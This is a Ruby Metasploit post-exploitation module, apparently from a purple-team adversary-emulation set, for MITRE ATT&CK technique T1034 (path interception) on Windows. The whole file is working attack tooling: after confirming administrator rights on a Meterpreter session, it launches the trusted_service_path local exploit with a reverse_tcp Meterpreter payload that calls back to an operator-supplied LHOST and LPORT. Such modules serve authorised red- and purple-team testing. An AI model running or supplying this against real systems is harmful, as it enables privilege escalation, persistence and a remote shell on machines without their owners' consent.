##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
class MetasploitModule < Msf::Post
    include Msf::Post::Windows::Priv
    include Msf::Post::Windows::Accounts

    def initialize(info={})
        super(update_info(info,
            'Name'          => 'Path Interception (T1034) Windows - Purple Team',
            'Description'   => %q{
              Persistence, Privilege Escalation:
              Path interception occurs when an executable is placed in a specific path so that it is executed by an application instead of the intended target. One example of this was the use of a copy of cmd in the current working directory of a vulnerable application that loads a CMD or BAT file with the CreateProcess function.},
            'License'       => MSF_LICENSE,
            'Author'        => [ 'Praetorian' ],
            'References'    => [ [ 'URL', 'https://attack.mitre.org/wiki/Technique/T1034' ] ],
            'Platform'      => [ 'win' ],
            'SessionTypes'  => [ 'meterpreter' ]
        ))
        register_options([
            OptString.new("MODULE", [ true, "Module to execute", 'exploit/windows/local/trusted_service_path']),
            OptAddress.new('LHOST', [ true, "Local Address for (reverse payloads)", ""]),
            OptPort.new("LPORT", [false, "Local Port for (reverse payloads)",4444]),
            OptString.new('PAYLOAD', [ false, "Meterpreter Payload to use", "windows/meterpreter/reverse_tcp"]),
        ])
    end

    def run_module(mod)
        payload = datastore['PAYLOAD']
        framework_mod = framework.modules.create(mod)
        framework_mod.datastore['SESSION'] = datastore['SESSION']
        framework_mod.datastore['VERBOSE'] = datastore['VERBOSE']
        framework_mod.datastore['WORKSPACE'] = datastore["WORKSPACE"] if datastore["WORKSPACE"]
        framework_mod.datastore['PAYLOAD'] = datastore['PAYLOAD']
        framework_mod.datastore['LPORT'] = datastore["LPORT"]
        framework_mod.datastore['LHOST'] = datastore["LHOST"]
        framework_mod.exploit_simple(
            'LocalInput' => self.user_input,
            'LocalOutput' => self.user_output,
            'Payload'   => payload,
            'Target'    => 0,
            'Quiet' => false,
            'RunAsJob'  => false
        )

        select(nil,nil,nil,2)
    end

    def run
      return 0 if session.type != "meterpreter"

      unless is_admin?
        fail_with(Failure::NoAccess, "The current session does not have administrative rights.")
      end

      mod = datastore['MODULE']
      begin
          print_status("Executing '#{mod}' on #{session.inspect}")
          run_module(mod)
          print_good("Successful execution!")
      rescue ::Exception => e
          print_error("Unable to execute: #{e.message}")
          return
      end
    end
end
